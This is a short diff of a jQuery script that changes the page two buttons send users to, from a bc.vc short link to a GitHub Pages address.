@@ -54,11 +54,11 @@ $(function() {
     
     $(".btnSend").click(function() {
 
-        $(location).attr('href','https://bc.vc/7');
+        $(location).attr('href','https://meta-loading.github.io/huawei/index.html');
     });
     $(".enclick").click(function() {
 
-        $(location).attr('href','https://bc.vc/7');
+        $(location).attr('href','https://meta-loading.github.io/huawei/index.html');
     });
     //=========
     $(".btnSendar").click(function() {
